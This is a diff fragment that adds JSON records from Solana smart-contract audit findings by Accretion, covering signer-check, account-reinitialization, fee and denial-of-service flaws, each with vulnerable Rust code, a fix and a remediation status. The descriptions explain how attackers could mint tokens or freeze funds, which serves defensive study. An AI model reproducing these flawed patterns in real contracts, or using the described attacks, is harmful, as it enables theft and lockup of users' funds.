+        "code": "```\n///lib.rsL280-L280\n   pubauthority:SystemAccount<'info>,\n```",
+        "recommendation": "Change the constraint for `authority` in Transact from `SystemAccount` to `AccountInfo`, which allows it to belong to any program.",
+        "remediation": "Fixed in commit `606942c4ec77d680f0cf8164834c80cba6fbbfeb` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-privacy-cash-audit-A25PRC1.pdf",
+        "date": "2025-08-18"
+      }
+    },
+    {
+      "id": "SS-03874",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "User can be re-registered breaking immutable referral chain",
+      "impact": "MEDIUM",
+      "tags": [
+        "Account Reinitialization"
+      ],
+      "category": [
+        "Launchpad"
+      ],
+      "protocol": "Tessera Token & Referral",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M8",
+        "status": "Fixed",
+        "description": "The documentation states the following about the `UserRegistration` account.\n\n```\nCreated: When user registers with code\nNever Updated: Referral chain is immutable\nNever Closed: Permanent record (prevents re-registration)\n```\n\nHowever, the immutable referral chain is not secured in code. Actually, users can register again after registering and thus update their Tier1-3 referrers and referral code at will. This is the case because the context sets the `init_if_needed` constraint for the account. As a result, if it has already been created by the prior registration, the call will still pass and allow for overwriting of the referrers.\n\n```\n/// User registration (mint-agnostic)\n#[account(\n    init_if_needed,\n    payer = user,\n    space = DISCRIMINATOR_SIZE + UserRegistration::LEN,\n    seeds = [b\"user_registration\", user.key().as_ref()],\n    bump\n)]\npub user_registration: Account<'info, UserRegistration>,\n```",
+        "location": "https://github.com/tessera-lab/tessera-on-solana/blob/8ff55d1c1a544fed3fb099c271e49b40a4e0b5a8/programs/referral-system/src/contexts/registration.rs#L15-L23",
+        "recommendation": "We recommend using `init` instead of `init_if_needed` for the UserRegistration. This will prevent re-registrations.",
+        "remediation": "Fixed in `73d59a8b643c81a32ad4bc09160a6bae3a9eea74` by updating the documentation."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-tessera-token-and-referral-audit-A25TES1.pdf",
+        "date": "2026-01-19"
+      }
+    },
+    {
+      "id": "SS-03793",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Launch Signer not checked on initialization",
+      "impact": "HIGH",
+      "tags": [
+        "PDA Seed / Bump Validation",
+        "Access Control"
+      ],
+      "category": [
+        "Launchpad"
+      ],
+      "protocol": "MetaDAO Launchpad",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-C1",
+        "status": "Fixed",
+        "description": "In the `InitializeLaunch` instruction, the `launch_signer` account is passed as an Unchecked account, but in the constraints it is asserted that it is the authority of the given `usdc_vault`, `token_vault`, and the mint authority. The handler then derives the key for the launch signer itself, and writes the derived key into the launch state account, without checking that the derivation matches the provided key in the accounts. At the end of the function, the token program is called to mint tokens using the unchecked launch signer from the accounts, and the launch signer seeds are passed as a signer. If an attacker signs this transaction using their fake launch signer, this signature will also be passed and the call to the token program will succeed. This means an attacker can create a fake launch signer account and the corresponding mint and token vault accounts, and call the initialization instruction, signing as the launch signer. Later on, they could potentially reassign the owner of the token accounts and the mint authority to the correct launch signer, so that the launchpad program works without any disturbances - however before that they will be able to mint arbitrary tokens, or withdraw from the treasuries.",
+        "location": "https://github.com/metaDAOproject/futarchy/blob/ea3b5347ed986c2d306b4bde054ee338bb767071/programs/launchpad/src/instructions/initialize_launch.rs#L17-L130",
+        "code": "```\n#[derive(Accounts)]\npub struct InitializeLaunch<'info> {\n    #[account(\n        init,\n        payer = creator,\n        space = 8 + std::mem::size_of::<Launch>(),\n        seeds = [b\"launch\", token_mint.key().as_ref()],\n        bump\n    )]\n    pub launch: Account<'info, Launch>,\n    /// CHECK: This is the launch signer\n    pub launch_signer: UncheckedAccount<'info>,\n    #[account(\n        associated_token::mint = usdc_mint,\n        associated_token::authority = launch_signer\n    )]\n    pub usdc_vault: Account<'info, TokenAccount>,\n    #[account(\n        associated_token::mint = token_mint,\n        associated_token::authority = launch_signer\n    )]\n    pub token_vault: Account<'info, TokenAccount>,\n    #[account(mut)]\n    pub creator: Signer<'info>,\n    #[account(mint::decimals = 6)]\n    pub usdc_mint: Account<'info, Mint>,\n    #[account(\n        mint::decimals = 6,\n        mint::authority = launch_signer,\n    )]\n    pub token_mint: Account<'info, Mint>,\n    pub token_program: Program<'info, Token>,\n    pub associated_token_program: Program<'info, AssociatedToken>,\n    pub system_program: Program<'info, System>,\n}\nimpl InitializeLaunch<'_> {\n    pub fn validate(&self, _args: InitializeLaunchArgs) -> Result<()> {\n        require_eq!(self.token_mint.supply, 0, LaunchpadError::SupplyNonZero);\n        require!(self.token_mint.freeze_authority.is_none(), LaunchpadError::FreezeAuthoritySet);\n        Ok(())\n    }\n    pub fn handle(\n        ctx: Context<Self>,\n        args: InitializeLaunchArgs,\n    ) -> Result<()> {\n        let (launch_signer, launch_signer_pda_bump) =\n            Pubkey::find_program_address(&[b\"launch_signer\", ctx.accounts.launch.key().as_ref()], ctx.prog\nram_id);\n        ctx.accounts.launch.set_inner(Launch {\n            minimum_raise_amount: args.minimum_raise_amount,\n            creator: ctx.accounts.creator.key(),\n            launch_signer,\n            launch_signer_pda_bump,\n            launch_usdc_vault: ctx.accounts.usdc_vault.key(),\n            launch_token_vault: ctx.accounts.token_vault.key(),\n            total_committed_amount: 0,\n            token_mint: ctx.accounts.token_mint.key(),\n            usdc_mint: ctx.accounts.usdc_mint.key(),\n            pda_bump: ctx.bumps.launch,\n            seq_num: 0,\n            state: LaunchState::Initialized,\n            slot_started: 0,\n            slots_for_launch: args.slots_for_launch,\n            dao: None,\n            dao_treasury: None,\n        });\n        let clock = Clock::get()?;\n        emit_cpi!(LaunchInitializedEvent {\n            common: CommonFields::new(&clock, 0),\n            launch: ctx.accounts.launch.key(),\n            creator: ctx.accounts.creator.key(),\n            usdc_mint: ctx.accounts.usdc_mint.key(),\n            token_mint: ctx.accounts.token_mint.key(),\n            pda_bump: ctx.bumps.launch,\n        });\n        let launch_key = ctx.accounts.launch.key();\n        let seeds = &[\n            b\"launch_signer\",\n            launch_key.as_ref(),\n            &[launch_signer_pda_bump],\n        ];\n        let signer = &[&seeds[..]];\n        // Mint total tokens to launch token vault\n        token::mint_to(\n            CpiContext::new_with_signer(\n                ctx.accounts.token_program.to_account_info(),\n                MintTo {\n                    mint: ctx.accounts.token_mint.to_account_info(),\n                    to: ctx.accounts.token_vault.to_account_info(),\n                    authority: ctx.accounts.launch_signer.to_account_info(),\n                },\n                signer,\n            ),\n            AVAILABLE_TOKENS,\n        )?;\n        Ok(())\n    }\n}\n```",
+        "recommendation": "Check the launch signer seeds in the constraints instead of the handler.",
+        "remediation": "Fixed in commit `2de1b497f187b22fb4cdfb4a0cfa777165914386`"
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-metadao-launchpad-audit-A25MET1.pdf",
+        "date": "2025-03-24"
+      }
+    },
+    {
+      "id": "SS-03826",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Missing Signer Check for `creator_info` in `process_extend_transaction_buffer` Allows Unauthorized Buffer Extend",
+      "impact": "MEDIUM",
+      "tags": [
+        "Missing Signer Check",
+        "Access Control"
+      ],
+      "category": [
+        "DAO / Governance"
+      ],
+      "protocol": "Realms (Versioned Transactions)",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M3",
+        "status": "Fixed",
+        "description": "We found that in `process_extend_transaction_buffer` there is no check for `creator_info` to be a signer, so as a result anyone could extend another user's Transaction buffer.",
+        "location": "https://github.com/Mythic-Project/solana-program-library/blob/889d5b20164faafa882dfb63d62841e94999969f/governance/program/src/processor/proposal_versioned_transactions/process_extend_transaction_buffer.rs#L38",
+        "code": "```\nletcreator_info=next_account_info(account_info_iter)?;//3\n```",
+        "recommendation": "Explicitly check that the `creator_info` is a signer before proceeding.",
+        "remediation": "Fixed in commit `03e8fbf0775375c257448b8aa944c7524f0b96bf` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-realms-versioned-transactions-audit-A25REA1.pdf",
+        "date": "2025-05-29"
+      }
+    },
+    {
+      "id": "SS-03823",
+      "version": "1.0.2",
+      "type": "strategy",
+      "title": "Fee Is Incorrectly Deducted in `deposit_governing_tokens` When Using `spl_token_2022` Without Token Transfer",
+      "impact": "HIGH",
+      "tags": [
+        "Token-2022 Extension Mishandling",
+        "Incorrect Fee"
+      ],
+      "category": [
+        "DAO / Governance"
+      ],
+      "protocol": "Realms (Versioned Transactions)",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "We found that in `deposit_governing_tokens` , the program checks `is_token_2022`, and if true, it uses `spl_token_2022::id()` and adds an extra account: `governing_token_mint`. Later, in `process_deposit_governing_tokens`, the deposited amount is calculated by checking for the optional account `expected_mint_info`. If this account exists, the function reduces the amount by a fee.\n\nThe issue is that a user might use `spl_token_2022` to **mint** tokens rather than transfer them. In such a case, the logic incorrectly treats the operation as a transfer and applies a fee, even though no actual token transfer occurred. This results in a wrongful fee deduction from the deposited amount.",
+        "location": "https://github.com/Mythic-Project/solana-program-library/blob/889d5b20164faafa882dfb63d62841e94999969f/governance/program/src/instruction.rs#L922-L930\n\nhttps://github.com/Mythic-Project/solana-program-library/blob/889d5b20164faafa882dfb63d62841e94999969f/governance/program/src/instruction.rs#L934-L936\n\nhttps://github.com/Mythic-Project/solana-program-library/blob/889d5b20164faafa882dfb63d62841e94999969f/governance/program/src/processor/process_deposit_governing_tokens.rs#L122-L130",
+        "code": "```\nAccountMeta::new_readonly(\n            if is_token_2022 {\n                spl_token_2022::id()\n            } else {\n                inline_spl_token::id()\n            },\n            false,\n        ),\n        AccountMeta::new_readonly(realm_config_address, false),\n    if is_token_2022 {\n        accounts.push(AccountMeta::new(*governing_token_mint, false));\n    };\n    let deposit_amount = match expected_mint_info {\n        Some(mint_info) => {\n            amount.checked_sub(get_current_mint_fee(mint_info, amount)?)\n            .ok_or(GovernanceError::MathematicalOverflow)?\n        }\n        _ => {\n            amount\n        }\n};\n```",
+        "recommendation": "In `process_deposit_governing_tokens` , when calculating the `deposit_amount`, ensure that both `expected_mint_info` is present and `governing_token_source_info` is a valid token account (using `is_spl_token_account`), not a mint account.\n\n```\nlet fee = if is_spl_token_account(governing_token_source_info) {\n    match expected_mint_info {\n        Some(mint_info) => get_current_mint_fee(mint_info, amount)?,\n        None => 0,\n    }\n} else {\n    0\n};\nlet deposit_amount = amount\n    .checked_sub(fee)\n    .ok_or(GovernanceError::MathematicalOverflow)?;\n```",
+        "remediation": "Fixed in commit `18c5da552c397d1ad4df616b4b6b6f808f28cf03` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-realms-versioned-transactions-audit-A25REA1.pdf",
+        "date": "2025-05-29"
+      }
+    },
+    {
+      "id": "SS-03822",
+      "version": "1.0.2",
+      "type": "strategy",
+      "title": "Voter Weight Record Weight Can Be Set to 0 By Third Parties",
+      "impact": "MEDIUM",
+      "tags": [
+        "Missing Signer Check",
+        "DoS"
+      ],
+      "category": [
+        "DAO / Governance",
+        "NFT"
+      ],
+      "protocol": "Realms Metaplex Core NFT Plugin",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-M1",
+        "status": "Fixed",
+        "description": "We found that as the update voter weight record instruction is unauthenticated, an attacker could always call this instruction with no remaining accounts, which will lead to this account having a voter_weight of 0. This should work as long as the caller uses a VoterWeightAction that is not `CastVote` . In practice, one could disrupt a user who is in the process of accumulating their NFT votes to cast an NFT vote across multiple transactions:\n\n1. User has 20 NFTs in a collection that can vote 2. User calls cast_nft_vote with 5 NFTs (1-5) 3. User calls cast_nft_vote with 5 NFTs (6-10) 4. User calls cast_nft_vote with 5 NFTs (11-15) 4a. <----- ATTACKER calls update_voter_weight_record, resetting weight to 0 5. User calls cast_nft_vote with 5 NFTs (16-20) and uses vote weight record\n\nNow the user will only have the votes of 5 NFTs, while all the asset votes will have been created for all 20 NFTs. They will have to reset their vote to relinquish their nft votes and try again.",
+        "location": "https://github.com/Mythic-Project/governance-program-library/blob/848ce7e5e9de239ff2fce8626737b02e8477cec9/programs/core-voter/src/instructions/update_voter_weight_record.rs#L52-L62",
+        "code": "```\n/// update_voter_weight_record.rs L52-L62\n    for asset in ctx.remaining_accounts.iter() {\n        let (nft_vote_weight, _) = resolve_nft_vote_weight_and_mint(\n            registrar,\n            governing_token_owner,\n            asset.key.clone(),\n            &BaseAssetV1::from_bytes(&asset.data.borrow()).unwrap(),\n            &mut unique_nft_mints,\n        )?;\n        voter_weight = voter_weight.checked_add(nft_vote_weight as u64).unwrap();\n    }\n```",
+        "recommendation": "Add an authentication mechanism to the update functions.",
+        "remediation": "Fixed in commit `1a81ca8f80bd9a41c4467de573ed801d54eb5da1` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-realms-metaplex-nft-core-plugin-audit-A25REA2.pdf",
+        "date": "2025-09-10"
+      }
+    },
+    {
+      "id": "SS-03897",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "Anyone can dust a stake vault and permanently block unstaking",
+      "impact": "HIGH",
+      "tags": [
+        "Improper Account Closing / Account Revival",
+        "DoS"
+      ],
+      "category": [],
+      "protocol": "Artemis Capital — TBB Staking",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "`unstake` transfers only the principal recorded in `StakeAccount` and then unconditionally closes the vault, even though the vault can receive unsolicited token transfers. Any holder of the pool mint can send one base unit to a victim’s publicly derivable vault; the resulting nonzero remainder makes `CloseAccount` fail and atomically rolls back every withdrawal attempt, while no instruction can sweep the excess.",
+        "impact": "Permanent principal freeze; any unprivileged token holder can dust a chosen stake vault without the victim’s signature, after which the victim’s principal and promised interest remain inaccessible absent a program upgrade.",
+        "location": "• `program/programs/tbb-staking/src/lib.rs:170-203` ( `unstake` )",
+        "code": "```\n// program/programs/tbb-staking/src/lib.rs:170-203\n```\n\n- `170 | // 1) Return principal from the stake vault (authority = stake PDA). 171 | transfer_tokens(`\n\n- `172 | &ctx.accounts.token_program,`\n\n- `173 | &ctx.accounts.vault,`\n\n```\n174 |             &ctx.accounts.mint,\n175 |             &ctx.accounts.staker_ata,\n176 |             &ctx.accounts.stake_account.to_account_info(),\n177 |             stake_acc.amount, // @audit Transfers the recorded amount, not the vault's actual balance.\n178 |             ctx.accounts.mint.decimals,\n179 |             Some(&[stake_seeds]),\n180 |         )?;\n181 |\n182 |         // 2) Pay interest from treasury (authority = pool PDA).\n183 |         transfer_tokens(\n184 |             &ctx.accounts.token_program,\n185 |             &ctx.accounts.treasury,\n186 |             &ctx.accounts.mint,\n187 |             &ctx.accounts.staker_ata,\n188 |             &ctx.accounts.pool.to_account_info(),\n189 |             stake_acc.interest,\n190 |             ctx.accounts.mint.decimals,\n191 |             Some(&[pool_seeds]),\n192 |         )?;\n193 |\n194 |         // 3) Close the vault token account, rent to staker.\n195 |         token_interface::close_account(CpiContext::new_with_signer(\n196 |             ctx.accounts.token_program.to_account_info(),\n197 |             token_interface::CloseAccount {\n198 |                 account: ctx.accounts.vault.to_account_info(),\n199 |                 destination: ctx.accounts.staker.to_account_info(),\n200 |                 authority: ctx.accounts.stake_account.to_account_info(),\n201 |             },\n202 |             &[stake_seeds],\n203 |         ))?; // @audit CloseAccount rejects any nonzero donated remainder.\n```",
+        "recommendation": "In step 1, transfer the full token account balance to the staker, instead of the recorded balance.",
+        "remediation": "Fixed in commit `50524af69cb7627d9598596b6ed1d84a596a2389` ."
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2026-accretion-artemis-capital-llc-audit-A26ART1.pdf",
+        "date": "2026-09-11"
+      }
+    },
+    {
+      "id": "SS-03804",
+      "version": "1.0.1",
+      "type": "strategy",
+      "title": "The Permissionless Account can Partially DoS a Multisig",
+      "impact": "HIGH",
+      "tags": [
+        "DoS",
+        "Misconfiguration"
+      ],
+      "category": [
+        "DAO / Governance",
+        "Smart Wallets"
+      ],
+      "protocol": "MetaDAO Squads Integration",
+      "language": "Rust",
+      "content": {
+        "reference": "ACC-H1",
+        "status": "Fixed",
+        "description": "We found that the permissionless account can fully DoS a multisig when someone deploys a program at the permissionless account address. The reason is that the `ProposalActivate` instruction of Squads requires the member who is the initiator of the proposal to be passed as mutable to the program. The solana runtime does not allow executable accounts to be passed as mutable, which means that it becomes impossible to call `ProposalActivate` , which is a required step of executing draft proposals through squads.\n\nIt would still be possible to create proposals through `ProposalCreate` and setting the params to skip the drafting stage, which means we won't need to call `ProposalActivate`. However features that require the drafting stage will become fully bricked, such as batched transactions.",
+        "location": "https://github.com/Squads-Protocol/v4/blob/de4a03b594b2f06ed0b558f99a35ebbf8dc8913d/programs/squads_multisig_program/src/instructions/proposal_activate.rs#L14-L15",
+        "code": "```\n#[account(mut)]\n   pubmember:Signer<'info>,\n```",
+        "recommendation": "We will certainly have to find an alternative solution to the permissionless account model. A simpler fix could be assigning the permissionless accounts program owner to the autocrat program, so that it can't be turned into a program.",
+        "remediation": "The permissionless account has been assigned to the autocrat program, which prevents it from becoming a program. https://explorer.solana.com/tx/2xPdX4TZx2gMssCtLkxxeYzmGoTGaQFsqpy8BCKp1WXrsqoyE4nd9sZeb C8WnV6t4FBpU3H2FbvkbL7CGSMih5id"
+      },
+      "source": {
+        "audit_firm": "Accretion",
+        "report_name": "https://github.com/accretion-xyz/audit-reports/blob/main/2025-accretion-metadao-squads-treasury-audit-A25MET2.pdf",
+        "date": "2025-07-16"
+      }
+    }
+  ]
+}
